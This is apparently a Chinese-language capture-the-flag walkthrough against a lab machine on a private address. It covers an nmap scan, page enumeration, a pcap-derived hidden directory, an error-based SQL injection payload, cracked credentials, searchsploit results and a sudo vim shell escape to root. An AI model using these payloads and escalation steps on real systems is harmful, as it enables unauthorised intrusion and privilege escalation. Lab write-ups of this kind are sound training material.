
## 扫描

> 靶机进行强度太高的扫描会断开连接

```
nmap -sS -A -p1-10000 --min-rate 10000 192.168.80.131
```


## web渗透

```
首页暴露了目录和用户还有可能的中间件信息

html_pages

patrick

Powered by IIS 6.0

访问html_pages得到目录
	-rw-r--r-- 1 www-data www-data      285 Sep 26 17:46 about.html
	-rw-r--r-- 1 www-data www-data     1049 Sep 26 17:51 config.html
	-rw-r--r-- 1 www-data www-data      199 Jul 23 15:37 default.html
	-rw-r--r-- 1 www-data www-data     1086 Sep 28 09:22 development.html
	-rw-r--r-- 1 www-data www-data      446 Jun 14 01:37 downloads.html
	-rw-r--r-- 1 www-data www-data      285 Sep 26 17:53 error.html
	-rw-r--r-- 1 www-data www-data        0 Sep 28 09:23 html_pages
	-rw-r--r-- 1 www-data www-data      751 Sep 28 09:22 index.html
	-rw-r--r-- 1 www-data www-data      202 Sep 26 17:57 login.html
	-rw-r--r-- 1 www-data www-data      682 Jul 23 15:36 register.html
	-rw-r--r-- 1 www-data www-data       74 Jul 23 16:29 tryharder.html
	-rw-r--r-- 1 www-data www-data      186 Sep 26 17:58 uploads.html

对全部目录进行访问

# about.html
暴露出的信息：David ，Good Tech

# config.html
无

# default.html和register.html
	01001000 01010101 01001000 00111111 
	
	01010011 01110101 01110010 01100101 01101100 01111001 00100000 01100100 01100101 01110110 01100101 01101100 01101111 01110000 01101101 01100101 01101110 01110100 00100000 01110011 01100101 01100011 01110010 01100101 01110100 00100000 01110000 01100001 01100111 01100101 00100000 01101001 01110011 00100000 01101110 01101111 01110100 00100000 01110100 01101000 01100001 01110100 00100000 01101000 01100001 01110010 01100100 00100000 01110100 01101111 00100000 01100110 01101001 01101110 01100100 00111111
解码：
for i in $(cat 1.txt);do echo "obase=16;ibase=2;$i" | bc | xxd -r -p;done
得到
HUH?
Surely development secret page is not that hard to find?

downloads.html
得到test.pcap


```
> **wireshark查看**
![[Pasted image 20240120124237.png]]
>得到/developmentsecretpage/directortestpagev1.php


> secret 目录结构

```
developmentsecretpage/
	directortestpagev1.php
	patrick.php
	sitemap.php?logout=
	securitynotice.php
```

> evelopmentsecretpage目录下的发现

```
得到用户
intern
patrick
david

' or updatexml(1,concat(0x7e,database(),0x7e),1)#



```


Webfroot Shoutbox 2.32 - 'Expanded.php' Directory Traversal                                                                                                                    | php/webapps/22705.txt
Webfroot Shoutbox 2.32 - 'Expanded.php' Remote Command Execution                                                                                                               | php/webapps/22702.pl
Webfroot Shoutbox 2.32 - 'URI' File Disclosure                                                                                                                                 | php/webapps/22671.txt
Webfroot Shoutbox 2.32 - 'Viewshoutbox.php' Cross-Site Scripting                                                                                                               | php/webapps/23474.txt
Webfroot Shoutbox 2.32 - Remote Command Execution                                                                                                                              | php/webapps/22687.pl
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution 

>通过测试登录，发现报错函数和一个路径文件信息

google搜索：`site: https://www.exploit-db.com/ slogin_lib.inc.php`

得到用户凭据存储文件名

admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81 ：12345678900987654321
patrick, 87e6d56ce79af90dbe07d387d3d0579e：P@ssw0rd25
qiu, ee64497098d0926d198f54f6d5431f98： qiu

## smb枚举

> smbclient //192.168.80.131/access -U intern 没有任何发现


## 提权
```
进行ssh登录发现patrick有sudo权限的vim

sudo /usr/bin/vim

:!/bin/sh
```

